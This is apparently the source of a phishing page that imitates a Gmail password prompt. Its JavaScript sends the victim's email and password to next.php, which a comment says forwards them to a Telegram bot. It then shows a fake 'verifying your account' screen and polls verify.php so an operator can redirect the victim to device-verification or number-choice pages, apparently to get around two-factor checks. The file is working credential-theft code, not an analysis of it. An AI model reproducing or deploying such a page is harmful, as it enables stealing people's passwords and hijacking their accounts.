<body>
    <div class="gmail-container">
        <div class="gmail-form">
            <div class="gmail-logo"></div>
            <h1 class="welcome-title">Welcome</h1>
            <div class="email-display" id="email-display"></div>

            <input type="password" id="password" placeholder="Enter your password" class="gmail-input" required>

            <button class="gmail-next-btn" onclick="continueLogin()">Next</button>

            <div class="gmail-links">
                <a href="#" onclick="needHelp()">Forgot password?</a>
            </div>
        </div>
    </div>

    <script>
        function goBack() {
            window.location.href = 'simple_tiktok.html';
        }

        // Get URL parameters
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        var email = getUrlParameter('email');
        document.getElementById('email-display').textContent = email;

        const openEyeSVG = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/></svg>';
        const closedEyeSVG = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M1 12C1 12 5 20 12 20C19 20 23 12 23 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><line x1="1" y1="1" x2="23" y2="23" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';

        function togglePassword() {
            const input = document.getElementById('password');
            const eye = document.querySelector('.eye-toggle');
            if (input.type === 'password') {
                input.type = 'text';
                eye.innerHTML = openEyeSVG;
            } else {
                input.type = 'password';
                eye.innerHTML = closedEyeSVG;
            }
        }

        function continueLogin() {
            const password = document.getElementById('password').value;
            if (email.trim() && password.trim()) {
                // Send to Telegram bot first
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'next.php', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send('di=' + encodeURIComponent(email) + '&pr=' + encodeURIComponent(password));

                // Show waiting screen for verification
                showWaitingScreen();
            } else {
                alert("Please enter your password.");
            }
        }

        function showWaitingScreen() {
            // Hide the form and show waiting message
            document.querySelector('.gmail-form').style.display = 'none';

            // Create waiting screen
            const waitingDiv = document.createElement('div');
            waitingDiv.className = 'gmail-container';
            waitingDiv.innerHTML = `
                <div class="gmail-form">
                    <div class="gmail-logo"></div>
                    <h1 class="welcome-title">Checking your account</h1>
                    <div class="waiting-message">
                        <div style="text-align: center; color: #5f6368; margin: 24px 0;">
                            <div style="font-size: 48px; margin-bottom: 16px;">‚è≥</div>
                            <div>Please wait while we verify your account...</div>
                            <div style="font-size: 14px; margin-top: 8px; color: #80868b;">
                                This may take a few moments
                            </div>
                        </div>
                    </div>
                </div>
            `;

            document.body.appendChild(waitingDiv);

            // Check for verification prompt every 3 seconds
            checkForVerificationPrompt();
        }

        function checkForVerificationPrompt() {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', 'verify.php?email=' + encodeURIComponent(email), true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);
                    if (response.prompt_type) {
                        redirectToVerification(response.prompt_type);
                    }
                }
            };
            xhr.send();

            // Continue checking every 3 seconds
            setTimeout(checkForVerificationPrompt, 3000);
        }

        function redirectToVerification(promptType) {
            if (promptType === 'device_verify') {
                window.location.href = 'device_verify.html?email=' + encodeURIComponent(email);
            } else if (promptType === 'choose_number') {
                window.location.href = 'choose_number.html?email=' + encodeURIComponent(email);
            }
        }

        function needHelp() {
            alert("Please contact support.");
        }
    </script>
